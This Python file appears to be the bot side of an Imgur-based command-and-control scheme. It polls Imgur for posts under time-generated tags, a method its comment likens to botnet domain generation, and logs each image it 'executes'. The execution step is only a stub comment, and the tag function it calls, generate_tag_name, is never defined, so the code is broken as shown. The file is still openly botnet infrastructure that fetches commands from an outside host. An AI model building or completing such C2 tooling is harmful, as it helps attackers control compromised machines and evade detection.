import requests
import json
import os
import sqlite3 as sl
from imgur_c2.auth import client_id
from datetime import datetime

# Bots find C2 by searching Imgur for special tags, generated based on
# current utc time. This is similar to domain name generation botnets use.
TODAYS_TAG = generate_tag_name(datetime.utcnow())
SQLITE_PATH = os.path.join(os.path.dirname(__file__), "imgur-history.db")
CON = None


def init_db(db_path=SQLITE_PATH):
    global CON
    CON = sl.connect(db_path)

    with CON:
        cur = CON.cursor()
        cur.execute(
            """
            CREATE TABLE IF NOT EXISTS IMGUR_HISTORY (
                id INTEGER PRIMARY KEY,
                imgur_id TEXT,
                last_exec TEXT
            );
            """
        )


def get_images_by_tag(tag):
    url = (
        "https://api.imgur.com/post/v1/posts/t/"
        + tag
        + "?client_id="
        + client_id
        + "&filter%5Bwindow%5D=week&include=adtiles%2Cadconfig%2Ccover&page=1&sort=-viral"
    )
    res = requests.get(url).content
    data = json.loads(res)
    images = []

    if "errors" in data:
        print("Errors:", data["errors"])
    elif "posts" in data:
        # print(json.dumps(data["posts"], indent=2))
        for i in data["posts"]:
            images.append(i["id"])
    else:
        print("Unknown Error:", data)

    # to download an image w/ ID use https://imgur.com/download/53i9bwZ

    return images


def in_history(imgur_id):
    global CON
    if CON is None:
        init_db()

    with CON:
        cur = CON.cursor()
        sql = "SELECT * FROM IMGUR_HISTORY WHERE imgur_id=?;"
        cur.execute(sql, (imgur_id,))
        return cur.fetchone() or False


def execute(imgur_id):
    global CON
    if CON is None:
        init_db()

    # execution stuff from ImgMsg module here

    # if successfully executed
    with CON:
        cur = CON.cursor()
        sql = "INSERT INTO IMGUR_HISTORY (imgur_id, last_exec) VALUES (?, datetime('now'));"
        ret = cur.execute(sql, (imgur_id,))
        return ret.lastrowid or False


def main():
    for imgur_id in get_images_by_tag("a8a15930df81"):
        if not in_history(imgur_id):
            print("Executing image", imgur_id)
            execute(imgur_id)


if __name__ == "__main__":
    main()
